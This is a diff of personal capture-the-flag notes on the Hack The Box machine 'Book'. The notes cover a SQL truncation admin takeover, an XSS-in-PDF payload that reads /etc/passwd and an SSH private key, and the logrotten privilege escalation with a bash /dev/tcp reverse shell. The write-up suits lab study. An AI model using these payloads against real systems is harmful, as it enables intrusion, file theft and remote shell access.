@@ -1,7 +1,7 @@
 # Book Helped-Thorough
 
 Name: Book
-Date:  
+Date:  3/4/2024
 Difficulty:  Medium
 Goals: 
 - Failed to do the `logrotate` section of the Linux Privilege Escalation so has to look up the solution and this was the box that had the same solution
@@ -159,8 +159,7 @@ And now I remember why this is a minefield in noting everything that I have trie
 WTF is SQL truncation!?! - SEE Beyond Root:
 [Medium - r3d-buck3t: bypass-authentication-with-sql-truncation-attack](https://medium.com/r3d-buck3t/bypass-authentication-with-sql-truncation-attack-25a0c33ab87f)
 
-SQL truncation attack is in how SQL handles input when it is longer than the field it is writing to as when you are creating a text field in an SQL database, you also define the maximum length of the field.
-
+SQL truncation attack exploits how SQL handles input when it is longer than the field it is writing to. When you are creating a text field in an SQL database, you also define the maximum length of the field, but because SQL truncates the maximum width plus one including the  ` ` whitespace or url encoded as: `+`. That if we can enumerate the administration email address we may be able to create another administrator account, but:
 1. Do we fulfil requirements:
 	 - Is the site using SQL to store usernames (or equivalents) and passwords?
 	 - Can we register a new user? - Web Privilege Escalation 
@@ -200,24 +199,27 @@ Then I could not log into admin panel...went on a cross referencing spree
 Basically I did not understand that with truncation, we want to ***overwrite*** the email of admin@book.htb, because that account has that role. So from the top:
 ![](adminfromthetop.png)
 
+Client side bypasses just require some BurpSuite
 ![](clientsidejavascripburptotherescue.png)
 
-
+SQL Truncation attack
 ![](hopefully.png)
 
 Even the legends make the mistakes, boot.htb - Ippsec is awesome.
 ![](302found.png)
-
+And success!
 ![](moreplusignes.png)
 
-
+Looking at the tabs in the administration panel
 ![](adminuserspanel.png)
 
+Checking the source code of collections.php
 ![](admincolleections.png)
 
 PDF User dumping
 ![](usersaspdf.png)
 
+Despite downloading the previous users data pdf I still have it in brain that XSS would trigger on the server side so 
 ![](collectionsdatapdf.png)
 
 ## Foothold
@@ -268,6 +270,7 @@ Scanning around in the video, noticing that Ippsec does alot that I could watch 
 /home/reader/.ssh/id_rsa
 ```
 
+0xdf payload:
 ```javascript
 <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
 ```
@@ -291,10 +294,11 @@ And so demonstrate how I followed allow before
 
 ![](rsainpdf.png)
 
+Weird formating and checking how many characters er line
 ![](64timestheamounttoget2046.png)
-
+...
 ![](onelongline.png)
-
+This did not work, but I was in a rush to get this done:
 ![](standupidrsakeyandfoldyourself12times.png)
 
 [unix.stackexchange](https://unix.stackexchange.com/questions/489775/how-to-insert-newline-characters-every-n-chars-into-a-long-string)
@@ -306,10 +310,10 @@ Also wrote `vi` trapping Hackers for decade on Linux!
 
 Time is an issue PDF2HTML is what ippsec used - I tried this because it is a CTF... https://pdf.io/pdf2html/
 ![](betterkey.png)
-
+Now it is just question marks to remove
 ![](questionmarksintheencoding.png)
 ## Privilege Escalation
-
+`ssh` in as reader:
 ![](user.png)
 
 One of the reason I am here is because I guessed this box is vulnerable to a pretty nasty 
@@ -345,6 +349,7 @@ Unfortunately this did not work....
 
 ```
 https://github.com/whotwagner/logrotten
+cd logrotten
 gcc -o logrotten logrotten.c
 ```
 
@@ -352,13 +357,13 @@ rev_shell.sh
 ```bash
 #!/bin/bash
 
-bash -i >& /dev/tcp/10.10.14.76/8443 0>&1 
+bash -i >& /dev/tcp/10.10.10.10/8443 0>&1 
 ```
 
 ```bash
 gcc -o logrotten logrotten.c 
-
-echo 0xdf >> /home/reader/backups/access.log; ./logrotten /home/reader/backups/access.log rev_shell.sh 
+chmod +x rev_shell.sh logrotten
+echo 0xdf >> /home/reader/backups/access.log; ./logrotten /home/reader/backups/access.log -p rev_shell.sh 
 ```
 
 ![](root.png)
